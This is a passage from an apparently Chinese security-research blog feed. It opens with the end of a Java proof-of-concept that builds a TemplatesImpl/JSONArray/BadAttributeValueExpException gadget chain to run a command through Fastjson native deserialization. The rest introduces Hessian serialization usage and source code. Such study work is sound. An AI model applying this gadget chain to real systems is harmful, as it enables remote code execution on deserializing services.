<span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,bd);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;çœ‹äº†fastjsonçš„å„ç‰ˆæœ¬é“¾å­ï¼Œå†çœ‹ä¸€ä¸‹fastjsonçš„åŸç”Ÿååºåˆ—åŒ–ï¼Œçœ‹çš„æ˜¯y4å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hessianååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-08T09:21:49.000Z</published>
    <updated>2024-11-26T16:42:08.614Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥å­¦ä¸€ä¸‹Hessianååºåˆ—åŒ–ï¼Œä¸»è¦å‚è€ƒsu18å¸ˆå‚…çš„æ–‡ç« ï¼š</p><h1 id="hessianç®€ä»‹"><a href="#Hessianç®€ä»‹" class="headerlink" title="Hessianç®€ä»‹"></a>Hessianç®€ä»‹</h1><p>ç›´æ¥æŠ„su18å¸ˆå‚…é‡Œé¢çš„</p><p>Hessian æ˜¯ <a href="https://caucho.com/">caucho</a> å…¬å¸çš„å·¥ç¨‹é¡¹ç›®ï¼Œä¸ºäº†è¾¾åˆ°æˆ–è¶…è¿‡ ORMI&#x2F;Java JNI ç­‰å…¶ä»–è·¨è¯­è¨€&#x2F;å¹³å°è°ƒç”¨çš„èƒ½åŠ›è®¾è®¡è€Œå‡ºï¼Œåœ¨ 2004 ç‚¹å‘å¸ƒ 1.0 è§„èŒƒï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º Hessian ï¼Œå¹¶é€æ­¥è¿­ä»£ï¼Œåœ¨ Hassian jar 3.2.0 ä¹‹åï¼Œé‡‡ç”¨äº†æ–°çš„ 2.0 ç‰ˆæœ¬çš„åè®®ï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º Hessian 2.0ã€‚</p><p>è¿™æ˜¯ä¸€ç§åŠ¨æ€ç±»å‹çš„<a href="http://hessian.caucho.com/doc/hessian-serialization.html">äºŒè¿›åˆ¶åºåˆ—åŒ–</a>å’Œ <a href="http://hessian.caucho.com/doc/hessian-ws.html">Web æœåŠ¡</a>åè®®ï¼Œä¸“ä¸ºé¢å‘å¯¹è±¡çš„ä¼ è¾“è€Œè®¾è®¡ã€‚Hessian åè®®åœ¨è®¾è®¡æ—¶ï¼Œé‡ç‚¹çš„å‡ ä¸ªç›®æ ‡åŒ…æ‹¬äº†ï¼šå¿…é¡»å°½å¯èƒ½çš„å¿«ã€å¿…é¡»å°½å¯èƒ½ç´§å‡‘ã€è·¨è¯­è¨€ã€ä¸éœ€è¦å¤–éƒ¨æ¨¡å¼æˆ–æ¥å£å®šä¹‰ç­‰ç­‰ã€‚</p><p>å¯¹äºè¿™æ ·çš„è®¾è®¡ï¼Œcaucho å…¬å¸å…¶å®æä¾›äº†ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€ä¸ªæ˜¯ Hessianï¼Œä¸€ä¸ªæ˜¯ Burlapã€‚Hession æ˜¯åŸºäºäºŒè¿›åˆ¶çš„å®ç°ï¼Œä¼ è¾“æ•°æ®æ›´å°æ›´å¿«ï¼Œè€Œ Burlap çš„æ¶ˆæ¯æ˜¯ XML çš„ï¼Œæœ‰æ›´å¥½çš„å¯è¯»æ€§ã€‚ä¸¤ç§æ•°æ®éƒ½æ˜¯åŸºäº HTTP åè®®ä¼ è¾“ã€‚</p><p>Hessian æœ¬èº«ä½œä¸º <a href="https://caucho.com/products/resin">Resin</a> çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å®ƒçš„ <code>com.caucho.hessian.client</code> å’Œ <code>com.caucho.hessian.server</code> åŒ…ä¸ä¾èµ–äºä»»ä½•å…¶ä»–çš„ Resin ç±»ï¼Œå› æ­¤å®ƒä¹Ÿå¯ä»¥ä½¿ç”¨ä»»ä½•å®¹å™¨å¦‚ Tomcat ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨ EJB ä¸­ã€‚äº‹å®ä¸Šå¾ˆå¤šé€šè®¯æ¡†æ¶éƒ½ä½¿ç”¨æˆ–æ”¯æŒäº†è¿™ä¸ªè§„èŒƒæ¥åºåˆ—åŒ–åŠååºåˆ—åŒ–ç±»ã€‚</p><p>ä½œä¸ºä¸€ä¸ªäºŒè¿›åˆ¶çš„åºåˆ—åŒ–åè®®ï¼ŒHessian è‡ªè¡Œå®šä¹‰äº†ä¸€å¥—è‡ªå·±çš„å‚¨å­˜å’Œè¿˜åŸæ•°æ®çš„æœºåˆ¶ã€‚å¯¹ 8 ç§åŸºç¡€æ•°æ®ç±»å‹ã€3 ç§é€’å½’ç±»å‹ã€ref å¼•ç”¨ä»¥åŠ Hessian 2.0 ä¸­çš„å†…éƒ¨å¼•ç”¨æ˜ å°„è¿›è¡Œäº†ç›¸å…³å®šä¹‰ã€‚è¿™æ ·çš„è®¾è®¡ä½¿å¾— Hassian å¯ä»¥è¿›è¡Œè·¨è¯­è¨€è·¨å¹³å°çš„è°ƒç”¨ã€‚</p><p>æœ‰å…³Hessianåè®®å’Œå…¶ä»–åè®®çš„å¯¹æ¯”ä»¥åŠååºåˆ—åŒ–åŸç†å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/ByteDanceTech/article/details/126188189">https://blog.csdn.net/ByteDanceTech/article/details/126188189</a></p><h1 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h1><p>su18å¸ˆå‚…çš„æ–‡ç« é‡Œé¢æä¾›äº†å¤šç§ä½¿ç”¨æ–¹å¼ï¼Œè¿™é‡Œæ¥å¤åˆ»ä¸€ä¸‹</p><h2 id="åŸºäºservlet"><a href="#åŸºäºServlet" class="headerlink" title="åŸºäºServlet"></a>åŸºäºServlet</h2><p>å®šä¹‰ä¸€ä¸ªæ–¹æ³•æ¥å£</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœåŠ¡ç«¯åˆ›å»ºè¯¥æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œå¹¶ç»§æ‰¿com.caucho.hessian.server.HessianServletæ¥å°†å…¶æ ‡è®°ä¸ºä¸€ä¸ªæä¾›æœåŠ¡çš„Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.server.HessianServlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><span class="hljs-meta">@WebServlet(name = &quot;hessian&quot;, value = &quot;/hessian&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HessianServlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello &quot;</span>+o.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åéœ€è¦é…ç½®Servletæ˜ å°„ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨äº†æ³¨è§£ï¼Œä¹Ÿå¯ä»¥ç”¨web.xmlæ¥é…ç½®</p><p>Client ç«¯é€šè¿‡ <code>com.caucho.hessian.client.HessianProxyFactory</code> å·¥å‚ç±»åˆ›å»ºå¯¹æ¥å£çš„ä»£ç†å¯¹è±¡ï¼Œå¹¶è¿›è¡Œè°ƒç”¨ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨åæ‰§è¡Œäº†æœåŠ¡ç«¯çš„é€»è¾‘å¹¶è¿”å›äº†ç»“æœã€‚</p><blockquote><p>è¿™ä¸€éƒ¨åˆ†å’ŒRMIçš„è¿œç¨‹è°ƒç”¨ç±»ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡ä»£ç†åˆ›å»ºå¯¹è±¡æ¥æ‰§è¡Œæ–¹æ³•çš„ï¼Œç­‰ä¼šåˆ†ææºç çš„æ—¶å€™ä¹Ÿä¼šçœ‹åˆ°</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8080/HessianServlet_war_exploded/hessian&quot;</span>;<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-type">Greeting</span> <span class="hljs-variable">greeting</span> <span class="hljs-operator">=</span> (Greeting) factory.create(Greeting.class, url);<br>        HashMap&lt;Object, Object&gt; object = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        object.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Hessian Call: &quot;</span>+greeting.sayHello(object));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410091058542.png" alt="image-20241009105834433"></p><p>è¿™é‡ŒHessianå¹¶ä¸éœ€è¦åƒRMIé‚£æ ·æ¥å£çš„åŒ…åéœ€è¦ç›¸åŒã€‚</p><h2 id="åŸºäºspring"><a href="#åŸºäºSpring" class="headerlink" title="åŸºäºSpring"></a>åŸºäºSpring</h2><p>Spring-web åŒ…å†…æä¾›äº† <code>org.springframework.remoting.caucho.HessianServiceExporter</code> ç”¨æ¥æš´éœ²è¿œç¨‹è°ƒç”¨çš„æ¥å£å’Œå®ç°ç±»ã€‚ä½¿ç”¨è¯¥ç±» export çš„ Hessian Service å¯ä»¥è¢«ä»»ä½• Hessian Client è®¿é—®ï¼Œå› ä¸º Spring ä¸­é—´æ²¡æœ‰è¿›è¡Œä»»ä½•ç‰¹æ®Šå¤„ç†ã€‚</p><p>ä» spring-web-5.3 åï¼Œè¯¥ç±»è¢«æ ‡è®°ä¸º <code>@Deprecated</code> ï¼Œ ä¹Ÿå°±æ˜¯è¯´ spring åœ¨é€æ¸æ·˜æ±°å¯¹åŸºäºåºåˆ—åŒ–çš„è¿œç¨‹è°ƒç”¨çš„ç›¸å…³æ”¯æŒã€‚</p><blockquote><p>æˆ‘è¿™é‡Œä¸€å¼€å§‹springboot3é‡Œé¢çš„spring-webæ˜¯6.1.13çš„ç‰ˆæœ¬ï¼Œæ˜¯ç›´æ¥è¿HessianServiceExporterè¿™ä¸ªç±»ä¹Ÿæ‰¾ä¸åˆ°äº†</p></blockquote><p>è¿™é‡Œå°±ä¸å°è¯•äº†ï¼Œcopyä¸€ä¸‹å®˜æ–¹æ–‡æ¡£çš„ä»£ç ç¤ºä¾‹ï¼š<a href="https://www.baeldung.com/spring-remoting-hessian-burlap">https://www.baeldung.com/spring-remoting-hessian-burlap</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">bookingService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">HessianServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æš´éœ²æœåŠ¡çš„ä»£ç ï¼Œå®¢æˆ·ç«¯åŒæ ·ç”¨å‰é¢çš„å³å¯ï¼Œåªéœ€è¦æ”¹ä¸€ä¸‹url</p><p>ä»–è¿˜æœ‰ä½¿ç”¨Burlapåè®®çš„å†™æ³•</p><p>æš´éœ²æœåŠ¡ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">burlapService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> BurlapProxyFactoryBean <span class="hljs-title function_">burlapInvoker</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapProxyFactoryBean</span> <span class="hljs-variable">invoker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapProxyFactoryBean</span>();<br>    invoker.setServiceUrl(<span class="hljs-string">&quot;http://localhost:8080/booking&quot;</span>);<br>    invoker.setServiceInterface(CabBookingService.class);<br>    <span class="hljs-keyword">return</span> invoker;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™æ³•åŸºæœ¬å’Œä½¿ç”¨hessianä¸€è‡´</p><h2 id="è‡ªå°è£…è°ƒç”¨"><a href="#è‡ªå°è£…è°ƒç”¨" class="headerlink" title="è‡ªå°è£…è°ƒç”¨"></a>è‡ªå°è£…è°ƒç”¨</h2><p>å°±æ˜¯é€šè¿‡å¯¹ <code>HessianInput/HessianOutput</code>ã€<code>Hessian2Input/Hessian2Output</code>ã€<code>BurlapInput/BurlapOutput</code> çš„ç›¸å…³æ–¹æ³•çš„å°è£…ï¼Œå¯ä»¥è‡ªè¡Œå®ç°ä¼ è¾“ã€å­˜å‚¨ç­‰é€»è¾‘ï¼Œä½¿ç”¨ Hessian è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ•°æ®ã€‚</p><p>è¿™é‡Œçš„Inputå’ŒOutputæ–¹æ³•å°±æ˜¯ç›´æ¥è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œå‰é¢çš„è°ƒç”¨ä¹Ÿéƒ½æ˜¯å¯¹è¿™äº›æ–¹æ³•è¿›è¡Œäº†å°è£…ï¼ŒOutputå°±æ˜¯åºåˆ—åŒ–å‡ºå»ï¼ŒInputå°±æ˜¯ååºåˆ—åŒ–</p><p>Inputæ–¹æ³•éƒ½ç»§æ‰¿è‡ªAbstractHessianInputè¿™ä¸ªæŠ½è±¡ç±»</p><p><img src="https://cdn.clown2024.cn/202410091608295.png" alt="image-20241009160850197"></p><p>Outputæ–¹æ³•åˆ™ç»§æ‰¿AbstractHessianOutputæŠ½è±¡ç±»</p><p><img src="https://cdn.clown2024.cn/202410091609188.png" alt="image-20241009160949153"></p><p>è¿™é‡Œå°è£…æˆä¸€ä¸ªå·¥å…·ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianUtil</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessianåºåˆ—åŒ–</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] result=<span class="hljs-literal">null</span>;<br>        Hessian2Output oo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<span class="hljs-comment">//å°è£…å­—èŠ‚æµ</span><br>        oo.writeObject(obj);<span class="hljs-comment">//å†™å…¥åºåˆ—åŒ–å¯¹è±¡å­—èŠ‚æµ</span><br>        oo.flush();<br>        result=bos.toByteArray();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessianååºåˆ—åŒ–</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> bytes</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        Hessian2Input oi=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bis);<br>        <span class="hljs-keyword">return</span> oi.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="jndiè°ƒç”¨"><a href="#JNDIè°ƒç”¨" class="headerlink" title="JNDIè°ƒç”¨"></a>JNDIè°ƒç”¨</h2><p>Hessian è¿˜å¯ä»¥é€šè¿‡å°† HessianProxyFactory é…ç½®ä¸º JNDI Resource çš„æ–¹å¼æ¥è°ƒç”¨ã€‚çœ‹æ–‡ç« æ˜¯ç”¨äº†resinæ¥é…ç½®çš„ï¼Œæˆ‘æ²¡æŸ¥åˆ°web.xmlçš„é…ç½®ï¼Œæˆªä¸ªæ–‡ç« çš„å›¾çŸ¥é“ä¸€ä¸‹ç®—äº†</p><p><img src="https://cdn.clown2024.cn/202410091644186.png" alt="image-20241009164415140"></p><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><h2 id="æ¥å£è°ƒç”¨"><a href="#æ¥å£è°ƒç”¨" class="headerlink" title="æ¥å£è°ƒç”¨"></a>æ¥å£è°ƒç”¨</h2><p>é‚£å‰é¢çš„åŸºäºServletçš„ä»£ç å…ˆæ¥åˆ†æï¼ŒHessianServletæ˜¯HttpServletçš„å­ç±»ï¼Œé‚£ä¹ˆHessianServlet çš„<code>init</code> æ–¹æ³•å°†ä¼šæ‰¿æ‹…ä¸€äº›åˆå§‹åŒ–çš„åŠŸèƒ½ï¼Œè€Œ <code>service</code> æ–¹æ³•å°†ä¼šæ˜¯ç›¸å…³å¤„ç†çš„èµ·å§‹ä½ç½®ã€‚</p><p>è¯¥ç±»çš„æˆå‘˜å˜é‡</p><p><img src="https://cdn.clown2024.cn/202410091650586.png" alt="image-20241009165055536"></p><p><code>_homeAPI</code>(è°ƒç”¨ç±»çš„æ¥å£ Class)ã€<code>_homeImpl</code>(å…·ä½“å®ç°ç±»çš„å¯¹è±¡)ã€<code>_serializerFactory</code>(åºåˆ—åŒ–å·¥å‚ç±»)ã€<code>_homeSkeleton</code>(å°è£…æ–¹æ³•)</p><p>çœ‹ä¸€ä¸‹initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091655779.png" alt="image-20241009165531713"></p><p>å°±æ˜¯å¯¹å„å˜é‡è¿›è¡Œåˆ¤æ–­æ˜¯å¦ä¸ºç©ºæ¥è¿›è¡Œåˆå§‹åŒ–ï¼Œå®ƒé‡Œé¢è°ƒç”¨äº†loadClassæ–¹æ³•æ¥åŠ è½½ç±»ï¼Œä¸è¿‡ä»–è¿™é‡Œè‡ªå·±é‡å†™äº†ä¸€ä¸ªloadClass</p><p><img src="https://cdn.clown2024.cn/202410091716251.png" alt="image-20241009171609208"></p><p><img src="https://cdn.clown2024.cn/202410091716148.png" alt="image-20241009171618113"></p><p>è¿™é‡Œä¼˜å…ˆä»çº¿ç¨‹è·å–ç±»åŠ è½½å™¨ï¼Œåº”è¯¥æ˜¯ä¸ºäº†æ›´å¿«åŠ è½½åˆ°å¯¹åº”çš„ç±»ï¼Œé¿å…èµ°åŒäº²å§”æ´¾çš„æµç¨‹ï¼Œçº¿ç¨‹çš„é»˜è®¤çš„ç±»åŠ è½½å™¨æ˜¯AppClassLoader</p><p>ç„¶åçœ‹ä»–çš„serviceæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091723880.png" alt="image-20241009172300818"></p><p>å¯ä»¥çœ‹åˆ°åªæ”¯æŒPOSTè¯·æ±‚ï¼Œè·å–idæˆ–è€…ejbidä½œä¸ºobjectIdï¼Œç„¶åè®¾ç½®ä¸€ä¸ªå“åº”å¤´ï¼Œå†å»è°ƒç”¨invokeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091724012.png" alt="image-20241009172457963"></p><p>ç„¶åå°±æ ¹æ®objectIdæ˜¯å¦ä¸ºç©ºæ¥é€‰æ‹©è°ƒç”¨çš„æ–¹æ³•</p><p>å…ˆçœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªæ–¹æ³•com.caucho.hessian.server.HessianSkeleton#invoke</p><p>è¯¥ç±»çš„çˆ¶ç±»æ˜¯AbstractSkeletonï¼Œè¯¥ç±»å¯¹Hessianæä¾›çš„æœåŠ¡è¿›è¡Œå°è£…</p><p><img src="https://cdn.clown2024.cn/202410091929088.png" alt="image-20241009192918042"></p><p>å…¶å°†æ–¹æ³•ã€æ–¹æ³•åç­‰ä¿å­˜åœ¨_methodMapé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410091932778.png" alt="image-20241009193223729"></p><p>ç„¶åHessianSkeletonåˆå§‹åŒ–å°±å°†è‡ªå·±çš„å®ç°ç±»ä¿å­˜åœ¨_serviceå˜é‡é‡Œé¢</p><p>è¯¥ç±»é‡Œé¢è¿˜æœ‰ä¸¤ä¸ªæˆå‘˜å˜é‡è¦çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410091937552.png" alt="image-20241009193725504"></p><p>ä¸¤ä¸ªå·¥å‚ç±»ï¼ŒHessianInputFactoryå°±æ˜¯ç”¨æ¥è¯»å–å’Œåˆ›å»ºHessianInput&#x2F;Hessian2Input æµï¼ŒHessianFactoryç”¨æ¥</p><p>åˆ›å»ºHessianInput&#x2F;Hessian2Input&#x2F;HessianOutput&#x2F;Hessian2Outputæµ</p><p>å¯¹ç±»åŸºæœ¬äº†è§£åå›è¿‡å¤´ç»§ç»­çœ‹invokeæ–¹æ³•</p><p><img 